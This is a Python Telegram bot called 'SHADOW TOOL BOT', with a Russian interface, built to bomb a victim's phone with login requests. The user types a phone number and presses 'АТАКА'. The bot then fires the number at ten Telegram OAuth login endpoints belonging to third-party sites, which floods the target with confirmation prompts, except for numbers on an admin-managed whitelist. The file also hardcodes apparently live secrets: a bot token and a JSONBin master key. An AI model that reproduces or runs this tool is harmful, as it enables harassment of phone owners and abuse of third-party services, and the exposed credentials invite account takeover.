import telebot
from telebot.types import ReplyKeyboardMarkup, KeyboardButton
import requests
import time
import json

BOT_TOKEN = '8768938960:AAGe5Pwh32P13XbwzXj7fzl5DVhYJLEIj0w'
ADMIN_ID = 8434489753

# ========== JSONBin.io КОНФИГ ==========
API_KEY = '$2a$10$DWV0FhJBA3jXAX8HDms6MuALT9NBDhI5iQSX.ZYLpF4fYOWHq1Y0C'
WHITELIST_BIN_ID = '69e29b0aaaba8821970e8018'

bot = telebot.TeleBot(BOT_TOKEN)

ATTACK_URLS = [
    'https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1',
    'https://translations.telegram.org/auth/request',
    'https://oauth.telegram.org/auth/request?bot_id=1093384146&origin=https%3A%2F%2Foff-bot.ru&embed=1',
    'https://oauth.telegram.org/auth/request?bot_id=466141824&origin=https%3A%2F%2Fmipped.com&embed=1',
    'https://oauth.telegram.org/auth/request?bot_id=5463728243&origin=https%3A%2F%2Fwww.spot.uz',
    'https://oauth.telegram.org/auth/request?bot_id=1733143901&origin=https%3A%2F%2Ftbiz.pro&embed=1',
    'https://oauth.telegram.org/auth/request?bot_id=319709511&origin=https%3A%2F%2Ftelegrambot.biz&embed=1',
    'https://oauth.telegram.org/auth/request?bot_id=1199558236&origin=https%3A%2F%2Fbot-t.com&embed=1',
    'https://oauth.telegram.org/auth/request?bot_id=1803424014&origin=https%3A%2F%2Fru.telegram-store.com&embed=1',
    'https://oauth.telegram.org/auth/request?bot_id=210944655&origin=https%3A%2F%2Fcombot.org&embed=1'
]

# ========== ФУНКЦИИ РАБОТЫ С JSONBin ==========
def load_whitelist():
    try:
        url = f"https://api.jsonbin.io/v3/b/{WHITELIST_BIN_ID}/latest"
        headers = {'X-Master-Key': API_KEY}
        response = requests.get(url, headers=headers)
        if response.status_code == 200:
            data = response.json()
            return data['record'].get('phones', [])
        else:
            return []
    except Exception as e:
        print(f"Ошибка загрузки: {e}")
        return []

def save_whitelist(whitelist):
    try:
        url = f"https://api.jsonbin.io/v3/b/{WHITELIST_BIN_ID}"
        headers = {
            'Content-Type': 'application/json',
            'X-Master-Key': API_KEY
        }
        data = {'phones': whitelist}
        response = requests.put(url, json=data, headers=headers)
        return response.status_code == 200
    except Exception as e:
        print(f"Ошибка сохранения: {e}")
        return False

# Загружаем белый список при старте
whitelist = load_whitelist()
print(f"📋 Загружено {len(whitelist)} номеров из облака")

def normalize_phone(phone):
    clean = ''.join(filter(str.isdigit, phone))
    if clean.startswith('8'):
        clean = '7' + clean[1:]
    if len(clean) == 10:
        clean = '7' + clean
    if not clean.startswith('+'):
        clean = '+' + clean
    return clean

def is_admin(user_id):
    return user_id == ADMIN_ID

# ========== ГЛАВНОЕ МЕНЮ ==========
def get_main_menu(user_id):
    markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=1)
    markup.add(KeyboardButton("🚀 АТАКА"))
    
    if is_admin(user_id):
        markup.add(KeyboardButton("📋 БЕЛЫЙ СПИСОК"))
        markup.add(KeyboardButton("➕ ДОБАВИТЬ"))
        markup.add(KeyboardButton("❌ УДАЛИТЬ"))
    
    return markup

@bot.message_handler(commands=['start'])
def start(message):
    bot.send_message(
        message.chat.id,
        "🔮 SHADOW TOOL BOT 🔮\n\n"
        f"👑 {'АДМИН' if is_admin(message.from_user.id) else 'ПОЛЬЗОВАТЕЛЬ'}\n\n"
        "👇 Нажми кнопку АТАКА",
        reply_markup=get_main_menu(message.from_user.id)
    )

# Обработка кнопок
@bot.message_handler(func=lambda message: True)
def handle_buttons(message):
    user_id = message.from_user.id
    text = message.text
    
    if text == "🚀 АТАКА":
        bot.send_message(message.chat.id, "📞 Введи номер:\nПример: +79001234567")
        bot.register_next_step_handler(message, attack_handler)
    
    elif text == "📋 БЕЛЫЙ СПИСОК" and is_admin(user_id):
        global whitelist
        whitelist = load_whitelist()
        if whitelist:
            phones = '\n'.join(whitelist)
            bot.send_message(message.chat.id, f"📋 БЕЛЫЙ СПИСОК:\n{phones}", reply_markup=get_main_menu(user_id))
        else:
            bot.send_message(message.chat.id, "📋 Пусто", reply_markup=get_main_menu(user_id))
    
    elif text == "➕ ДОБАВИТЬ" and is_admin(user_id):
        bot.send_message(message.chat.id, "📝 Введи номер для добавления:")
        bot.register_next_step_handler(message, add_handler)
    
    elif text == "❌ УДАЛИТЬ" and is_admin(user_id):
        bot.send_message(message.chat.id, "📝 Введи номер для удаления:")
        bot.register_next_step_handler(message, remove_handler)
    
    else:
        if not is_admin(user_id) and text in ["📋 БЕЛЫЙ СПИСОК", "➕ ДОБАВИТЬ", "❌ УДАЛИТЬ"]:
            bot.send_message(message.chat.id, "⛔ Доступ запрещён!", reply_markup=get_main_menu(user_id))

def attack_handler(message):
    user_id = message.from_user.id
    phone = message.text.strip()
    
    try:
        normalized = normalize_phone(phone)
        
        # Проверяем белый список (свежая загрузка)
        current_whitelist = load_whitelist()
        if normalized in current_whitelist:
            bot.send_message(message.chat.id, f"⛔ АТАКА ОТМЕНЕНА!\nНомер {normalized} в белом списке!", reply_markup=get_main_menu(user_id))
            return
        
        msg = bot.send_message(message.chat.id, f"🔥 АТАКА НА {normalized}...\n0/{len(ATTACK_URLS)}")
        
        sent = 0
        for i, url in enumerate(ATTACK_URLS):
            try:
                requests.post(url, data={'phone': normalized}, timeout=5)
                sent += 1
            except:
                sent += 1
            bot.edit_message_text(f"🔥 АТАКА НА {normalized}...\n{sent}/{len(ATTACK_URLS)}", message.chat.id, msg.message_id)
            time.sleep(0.3)
        
        bot.edit_message_text(f"🎯 ГОТОВО!\nОтправлено: {sent}/{len(ATTACK_URLS)}\nНомер: {normalized}", message.chat.id, msg.message_id)
        bot.send_message(message.chat.id, "✅ Атака завершена", reply_markup=get_main_menu(user_id))
        
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Ошибка: {str(e)}", reply_markup=get_main_menu(user_id))

def add_handler(message):
    user_id = message.from_user.id
    try:
        normalized = normalize_phone(message.text.strip())
        current_whitelist = load_whitelist()
        
        if normalized not in current_whitelist:
            current_whitelist.append(normalized)
            if save_whitelist(current_whitelist):
                global whitelist
                whitelist = current_whitelist
                bot.send_message(message.chat.id, f"✅ {normalized} добавлен в белый список!", reply_markup=get_main_menu(user_id))
            else:
                bot.send_message(message.chat.id, "❌ Ошибка сохранения в облако!", reply_markup=get_main_menu(user_id))
        else:
            bot.send_message(message.chat.id, f"⚠️ {normalized} уже в списке", reply_markup=get_main_menu(user_id))
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Ошибка: {e}", reply_markup=get_main_menu(user_id))

def remove_handler(message):
    user_id = message.from_user.id
    try:
        normalized = normalize_phone(message.text.strip())
        current_whitelist = load_whitelist()
        
        if normalized in current_whitelist:
            current_whitelist.remove(normalized)
            if save_whitelist(current_whitelist):
                global whitelist
                whitelist = current_whitelist
                bot.send_message(message.chat.id, f"✅ {normalized} удалён из белого списка!", reply_markup=get_main_menu(user_id))
            else:
                bot.send_message(message.chat.id, "❌ Ошибка сохранения в облако!", reply_markup=get_main_menu(user_id))
        else:
            bot.send_message(message.chat.id, f"⚠️ {normalized} не найден", reply_markup=get_main_menu(user_id))
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Ошибка: {e}", reply_markup=get_main_menu(user_id))

print("🤖 Бот запущен!")
print(f"👑 Админ ID: {ADMIN_ID}")
bot.infinity_polling()
